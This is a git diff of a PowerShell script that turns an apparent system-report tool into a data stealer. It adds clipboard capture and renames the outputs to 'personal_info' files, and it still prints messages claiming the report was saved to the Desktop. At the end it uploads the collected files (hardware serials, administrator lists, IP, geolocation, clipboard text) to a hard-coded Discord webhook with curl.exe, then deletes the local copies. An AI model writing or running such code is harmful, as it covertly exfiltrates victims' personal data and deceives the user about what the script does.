@@ -1,39 +1,48 @@
-$OutFile = "$env:USERPROFILE\Desktop\System_Report.txt"
+$OutFile = "$env:USERPROFILE\Documents\personal_info.txt"
+$OutFileClip = "$env:USERPROFILE\Documents\clipboard.txt"
+$OutFilePC = "$env:USERPROFILE\Documents\pc_info.txt"
 
-"==== CPU Information ====" | Out-File -Append $OutFile
-Get-CimInstance Win32_Processor | Select-Object Name, Manufacturer, NumberOfCores, NumberOfLogicalProcessors, MaxClockSpeed, Architecture | Out-File -Append $OutFile
+"==== CPU Information ====" | Out-File -Append $OutFilePC
+Get-CimInstance Win32_Processor | Select-Object Name, Manufacturer, NumberOfCores, NumberOfLogicalProcessors, MaxClockSpeed, Architecture | Out-File -Append $OutFilePC
 
-"==== RAM Information ====" | Out-File -Append $OutFile
-Get-WmiObject Win32_PhysicalMemory | Select-Object BankLabel, Capacity, Manufacturer, PartNumber, Speed, SerialNumber | Out-File -Append $OutFile
-Get-WmiObject -Class Win32_PhysicalMemoryArray | Select-Object MemoryDevices | Out-File -Append $OutFile
+"==== RAM Information ====" | Out-File -Append $OutFilePC
+Get-WmiObject Win32_PhysicalMemory | Select-Object BankLabel, Capacity, Manufacturer, PartNumber, Speed, SerialNumber | Out-File -Append $OutFilePC
+Get-WmiObject -Class Win32_PhysicalMemoryArray | Select-Object MemoryDevices | Out-File -Append $OutFilePC
 
-"==== Disk Drives and SMART Status ====" | Out-File -Append $OutFile
-Get-WmiObject Win32_DiskDrive | Select-Object Model, InterfaceType, MediaType, Size, SerialNumber, Status | Out-File -Append $OutFile
-try { Get-Disk | Get-StorageReliabilityCounter -ErrorAction SilentlyContinue | Out-File -Append $OutFile }catch {}
+"==== Disk Drives and SMART Status ====" | Out-File -Append $OutFilePC
+Get-WmiObject Win32_DiskDrive | Select-Object Model, InterfaceType, MediaType, Size, SerialNumber, Status | Out-File -Append $OutFilePC
+try { Get-Disk | Get-StorageReliabilityCounter -ErrorAction SilentlyContinue | Out-File -Append $OutFilePC }catch {}
 
-"==== GPU Information ====" | Out-File -Append $OutFile
-Get-WmiObject Win32_VideoController | Select-Object Name, AdapterRAM, DriverVersion, VideoProcessor | Out-File -Append $OutFile
+"==== GPU Information ====" | Out-File -Append $OutFilePC
+Get-WmiObject Win32_VideoController | Select-Object Name, AdapterRAM, DriverVersion, VideoProcessor | Out-File -Append $OutFilePC
 
-"==== Motherboard & BIOS Information ====" | Out-File -Append $OutFile
-Get-WmiObject Win32_BaseBoard | Select-Object Manufacturer, Product, SerialNumber, Version | Out-File -Append $OutFile
-Get-WmiObject Win32_BIOS | Select-Object SMBIOSBIOSVersion, Manufacturer, SerialNumber, ReleaseDate | Out-File -Append $OutFile
+"==== Motherboard & BIOS Information ====" | Out-File -Append $OutFilePC
+Get-WmiObject Win32_BaseBoard | Select-Object Manufacturer, Product, SerialNumber, Version | Out-File -Append $OutFilePC
+Get-WmiObject Win32_BIOS | Select-Object SMBIOSBIOSVersion, Manufacturer, SerialNumber, ReleaseDate | Out-File -Append $OutFilePC
 
-"==== Network Adapters (All) ====" | Out-File -Append $OutFile
-Get-NetAdapter | Select-Object Name, InterfaceDescription, Status, MacAddress, LinkSpeed | Out-File -Append $OutFile
+"==== Clipboard Contents ====" | Out-File -Append $OutFileClip
+try {
+    Add-Type -AssemblyName PresentationCore; 
+    ([Windows.Clipboard]::GetText()) | Out-File -Append $OutFileClip;
+}
+catch {}
 
-"==== Ethernet Link Speeds ====" | Out-File -Append $OutFile
-Get-NetAdapter | Where-Object {$_.Status -eq "Up"} | Select-Object Name, LinkSpeed | Out-File -Append $OutFile
+"==== Network Adapters (All) ====" | Out-File -Append $OutFilePC
+Get-NetAdapter | Select-Object Name, InterfaceDescription, Status, MacAddress, LinkSpeed | Out-File -Append $OutFilePC
 
-"==== DHCP Lease Info (if DHCP role is present) ====" | Out-File -Append $OutFile
-try { Get-DhcpServerv4Lease | Out-File -Append $OutFile } catch { "No local DHCP server or permissions issue `n" | Out-File -Append $OutFile }
+"==== Ethernet Link Speeds ====" | Out-File -Append $OutFilePC
+Get-NetAdapter | Where-Object {$_.Status -eq "Up"} | Select-Object Name, LinkSpeed | Out-File -Append $OutFilePC
 
-"==== User Profiles and Groups ====" | Out-File -Append $OutFile
-Get-WmiObject Win32_UserAccount | Where-Object {$_.LocalAccount -eq $true} | Out-File -Append $OutFile
+"==== DHCP Lease Info (if DHCP role is present) ====" | Out-File -Append $OutFilePC
+try { Get-DhcpServerv4Lease | Out-File -Append $OutFilePC } catch { "No local DHCP server or permissions issue `n" | Out-File -Append $OutFilePC }
 
-"==== List of Administrators ====" | Out-File -Append $OutFile
-Get-LocalGroupMember -Group "Administrators" | Select-Object Name, PrincipalSource, SID | Out-File -Append $OutFile
+"==== User Profiles and Groups ====" | Out-File -Append $OutFilePC
+Get-WmiObject Win32_UserAccount | Where-Object {$_.LocalAccount -eq $true} | Out-File -Append $OutFilePC
 
-"==== Last Logon Times for Local Profiles ====" | Out-File -Append $OutFile
+"==== List of Administrators ====" | Out-File -Append $OutFilePC
+Get-LocalGroupMember -Group "Administrators" | Select-Object Name, PrincipalSource, SID | Out-File -Append $OutFilePC
+
+"==== Last Logon Times for Local Profiles ====" | Out-File -Append $OutFilePC
 Get-WmiObject Win32_NetworkLoginProfile | Select-Object Name, 
 @{Name="LastLogon";Expression={ 
     if ($_.LastLogon) { 
@@ -56,45 +65,45 @@ Get-WmiObject Win32_NetworkLoginProfile | Select-Object Name,
     } else {
         $null
     }
-}}, CountryCode, Privileges | Out-File -Append $OutFile
+}}, CountryCode, Privileges | Out-File -Append $OutFilePC
 
-"==== Running Processes ====" | Out-File -Append $OutFile
-Get-Process | Select-Object Name, Id, Path | Out-File -Append $OutFile
+"==== Running Processes ====" | Out-File -Append $OutFilePC
+Get-Process | Select-Object Name, Id, Path | Out-File -Append $OutFilePC
 
-"==== Startup Programs ====" | Out-File -Append $OutFile
-Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, User | Out-File -Append $OutFile
+"==== Startup Programs ====" | Out-File -Append $OutFilePC
+Get-CimInstance Win32_StartupCommand | Select-Object Name, Command, User | Out-File -Append $OutFilePC
 
-"==== Recent System Errors/Warnings ====" | Out-File -Append $OutFile
+"==== Recent System Errors/Warnings ====" | Out-File -Append $OutFilePC
 Get-EventLog -LogName System -EntryType Error, Warning -Newest 50 |
-    ForEach-Object { "[$($_.EntryType)] $($_.TimeGenerated) $($_.Source): $($_.Message)" } | Out-File -Append $OutFile
+    ForEach-Object { "[$($_.EntryType)] $($_.TimeGenerated) $($_.Source): $($_.Message)" } | Out-File -Append $OutFilePC
 
-"==== Windows Updates Status ====" | Out-File -Append $OutFile
-Get-HotFix | Out-File -Append $OutFile
+"==== Windows Updates Status ====" | Out-File -Append $OutFilePC
+Get-HotFix | Out-File -Append $OutFilePC
 
-"==== Battery Information (if present) ====" | Out-File -Append $OutFile
-try{Get-WmiObject Win32_Battery | Out-File -Append $OutFile}catch{Write-Output "$_" | Out-File -Append $OutFile}
+"==== Battery Information (if present) ====" | Out-File -Append $OutFilePC
+try{Get-WmiObject Win32_Battery | Out-File -Append $OutFilePC}catch{Write-Output "$_" | Out-File -Append $OutFilePC}
 
-"==== Audio Devices ====" | Out-File -Append $OutFile
-Get-WmiObject Win32_SoundDevice | Out-File -Append $OutFile
+"==== Audio Devices ====" | Out-File -Append $OutFilePC
+Get-WmiObject Win32_SoundDevice | Out-File -Append $OutFilePC
 
-"==== Printers ====" | Out-File -Append $OutFile
-Get-WmiObject Win32_Printer | Out-File -Append $OutFile
+"==== Printers ====" | Out-File -Append $OutFilePC
+Get-WmiObject Win32_Printer | Out-File -Append $OutFilePC
 
-"==== OS Licensing ====" | Out-File -Append $OutFile
-Get-WmiObject SoftwareLicensingProduct | Where-Object { $_.PartialProductKey } | Select-Object Name, LicenseStatus | Out-File -Append $OutFile
+"==== OS Licensing ====" | Out-File -Append $OutFilePC
+Get-WmiObject SoftwareLicensingProduct | Where-Object { $_.PartialProductKey } | Select-Object Name, LicenseStatus | Out-File -Append $OutFilePC
 
-"==== Firewall Status ====" | Out-File -Append $OutFile
-Get-NetFirewallProfile | Select-Object Name, Enabled | Out-File -Append $OutFile
+"==== Firewall Status ====" | Out-File -Append $OutFilePC
+Get-NetFirewallProfile | Select-Object Name, Enabled | Out-File -Append $OutFilePC
 
-"==== Connected USB Devices (past/present) ====" | Out-File -Append $OutFile
+"==== Connected USB Devices (past/present) ====" | Out-File -Append $OutFilePC
 Get-WmiObject Win32_USBControllerDevice | ForEach-Object{
     try {
         $dev = [WMI]$_.Dependent
         "DeviceID: $($dev.DeviceID), Description: $($dev.Description), Manufacturer: $($dev.Manufacturer)"
     } catch {}
-} | Out-File -Append $OutFile
+} | Out-File -Append $OutFilePC
 
-"==== Detailed USB Device History ====" | Out-File $OutFile
+"==== Detailed USB Device History ====" | Out-File -Append $OutFilePC
 $usbStorRoot = "HKLM:\SYSTEM\CurrentControlSet\Enum\USBSTOR"
 if (Test-Path $usbStorRoot) {
     Get-ChildItem -Path $usbStorRoot | ForEach-Object {
@@ -143,30 +152,31 @@ Get-WmiObject Win32_DiskDrive | Where-Object { $_.InterfaceType -eq 'USB' } | Fo
             $output += "FileSystem     : $($l.FileSystem)"
         }
     }
-    $output | Out-File -Append $OutFile
-    "" | Out-File -Append $OutFile
+    $output | Out-File -Append $OutFilePC
+    "" | Out-File -Append $OutFilePC
 }
 
 # display all USB registry keys for deep forensics
 $usbRoot = "HKLM:\SYSTEM\CurrentControlSet\Enum\USB"
 if (Test-Path $usbRoot) {
-    "==== Raw USB Registry Entries ====" | Out-File -Append $OutFile
+    "==== Raw USB Registry Entries ====" | Out-File -Append $OutFilePC
     Get-ChildItem -Path $usbRoot | ForEach-Object {
-        "Key: $($_.Name)" | Out-File -Append $OutFile
+        "Key: $($_.Name)" | Out-File -Append $OutFilePC
     }
 }
 
 # User context for USB insertion is not directly available, but recent arrivals/install may show currently active user in Windows event logs
-"==== Recent USB Arrival Events (event logs) ====" | Out-File -Append $OutFile
+"==== Recent USB Arrival Events (event logs) ====" | Out-File -Append $OutFilePC
 Get-WinEvent -FilterHashtable @{LogName='System';ID=2003,2100,2102,2106,400,410,43} -MaxEvents 30 | ForEach-Object {
     "Time: $($_.TimeCreated), Message: $($_.Message)"
-} | Out-File -Append $OutFile
+} | Out-File -Append $OutFilePC
 
 # Get installed software
 Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
 Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
-Out-File -Append $OutFile
+Out-File -Append $OutFilePC
 
+# ---- Get Net Information ----
 Get-NetAdapter | Select-Object Name, MacAddress | Out-File -Append $OutFile
 
 Get-NetIPAddress | Where-Object { $_.AddressFamily -eq "IPv4" -and $_.InterfaceAlias -notlike "*Virtual*" } | Select-Object IPAddress | Out-File -Append $OutFile
@@ -187,7 +197,7 @@ if ($antiviruses) {
 }
 
 $PublicIP = (Invoke-RestMethod -Uri "https://api.ipify.org")
-Write-Output "Public IP Address: $PublicIP" | Out-File -Append $OutFile
+Write-Output "Public IP Address: $PublicIP `n" | Out-File -Append $OutFile
 
 $geo = Invoke-RestMethod -Uri "http://ip-api.com/json/" -UseBasicParsing
 
@@ -244,8 +254,14 @@ $HtmlContent = @"
 </body>
 </html>
 "@
-$HtmlPath = "$env:USERPROFILE\Desktop\DeviceLocation.html"
+$HtmlPath = "$env:USERPROFILE\Documents\DeviceLocation.html"
 $HtmlContent | Out-File -Encoding utf8 $HtmlPath
 
 Write-Output "System report created on your Desktop as System_Report.txt"
 Write-Output "Google Maps location HTML created on your Desktop as DeviceLocation.html"
+
+$webhookuri = "https://discord.com/api/webhooks/1334995176321581166/3RoYJez5stb8LCsQx_4znANOdHR87FODSlI5kEXVYIwCgwT7-Cx9C-IertebeqnNC5kH"
+
+curl.exe -F "file1=@$OutFile" -F "file2=@$OutFileClip" -F "file3=@$OutFilePC" -F "file4=@$HtmlPath" $webhookuri
+
+@($OutFile, $OutFileClip, $OutFilePC, $HtmlPath) | ForEach-Object { Remove-Item -Path $_ -Force }
